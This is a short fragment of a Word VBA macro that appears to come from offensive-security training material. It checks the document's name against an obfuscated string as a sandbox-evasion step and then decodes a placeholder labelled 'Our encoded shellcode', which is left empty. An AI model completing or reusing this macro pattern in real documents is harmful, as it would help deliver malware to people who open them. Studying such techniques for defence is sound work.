...
Function MyMacro()
    ...
    If ActiveDocument.Name <> Yellow("109126121113112058112123111121") Then
        Exit Function
    End If
    ' Our encoded shellcode
    Apples = ""
    Leap = Yellow(Apples)
